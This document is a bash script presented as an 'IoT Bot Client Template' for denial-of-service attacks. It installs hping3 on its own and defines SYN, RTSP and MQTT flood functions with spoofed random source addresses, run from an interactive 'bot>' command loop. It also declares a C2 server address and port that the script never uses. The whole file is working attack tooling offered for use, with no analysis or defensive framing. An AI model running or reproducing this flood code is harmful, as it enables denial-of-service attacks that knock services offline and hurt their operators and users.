#!/bin/bash
# IoT Bot Client Template
BOT_VERSION="1.0"
C2_SERVER="192.168.1.100"
BOT_PORT="4444"

# Auto-detect and install hping3
install_hping3() {
    if ! command -v hping3 &> /dev/null; then
        echo "[*] Installing hping3..."
        
        if command -v apt-get &> /dev/null; then
            apt-get update && apt-get install -y hping3
        elif command -v yum &> /dev/null; then
            yum install -y hping3
        elif command -v pacman &> /dev/null; then
            pacman -S --noconfirm hping3
        elif command -v apk &> /dev/null; then
            apk add hping3
        else
            echo "[!] Could not install hping3 - unknown package manager"
            exit 1
        fi
        
        echo "[+] hping3 installed successfully"
    else
        echo "[+] hping3 already installed"
    fi
}

# DDoS attack functions
syn_flood() {
    local target=$1
    echo "[*] Starting SYN flood against $target"
    hping3 -S -p 80 --flood --rand-source $target &
    echo $! > /tmp/ddos.pid
    echo "[+] SYN flood started (PID: $(cat /tmp/ddos.pid))"
}

rtsp_flood() {
    local target=$1
    echo "[*] Starting RTSP flood against $target"
    hping3 -S -p 554 --flood --rand-source $target &
    echo $! > /tmp/ddos.pid
    echo "[+] RTSP flood started (PID: $(cat /tmp/ddos.pid))"
}

mqtt_flood() {
    local target=$1
    echo "[*] Starting MQTT flood against $target"
    hping3 -S -p 1883 --flood --rand-source $target &
    echo $! > /tmp/ddos.pid
    echo "[+] MQTT flood started (PID: $(cat /tmp/ddos.pid))"
}

stop_attack() {
    if [ -f /tmp/ddos.pid ]; then
        local pid=$(cat /tmp/ddos.pid)
        kill $pid 2>/dev/null
        rm /tmp/ddos.pid
        echo "[+] Attack stopped (PID: $pid)"
    else
        echo "[!] No active attack found"
    fi
}

get_status() {
    if [ -f /tmp/ddos.pid ]; then
        local pid=$(cat /tmp/ddos.pid)
        if ps -p $pid > /dev/null 2>&1; then
            echo "[+] Attack running (PID: $pid)"
        else
            rm /tmp/ddos.pid
            echo "[!] Attack process not found"
        fi
    else
        echo "[!] No active attack"
    fi
}

# Main execution
main() {
    echo "[*] IoT Bot Client v$BOT_VERSION starting..."
    
    # Install dependencies
    install_hping3
    
    echo "[*] Bot ready for commands"
    echo "[*] Commands: attack <target> <type>, stop, status, exit"
    
    # Command loop
    while true; do
        read -p "bot> " cmd target type
        
        case $cmd in
            "attack")
                if [ -z "$target" ] || [ -z "$type" ]; then
                    echo "[!] Usage: attack <target_ip> <syn|rtsp|mqtt>"
                    continue
                fi
                
                case $type in
                    "syn") syn_flood $target ;;
                    "rtsp") rtsp_flood $target ;;
                    "mqtt") mqtt_flood $target ;;
                    *) echo "[!] Invalid attack type: $type" ;;
                esac
                ;;
            "stop") 
                stop_attack 
                ;;
            "status") 
                get_status 
                ;;
            "exit"|"quit") 
                stop_attack
                echo "[*] Bot shutting down..."
                break 
                ;;
            "") 
                continue 
                ;;
            *) 
                echo "[!] Unknown command: $cmd" 
                ;;
        esac
    done
}

# Start the bot
main "$@"
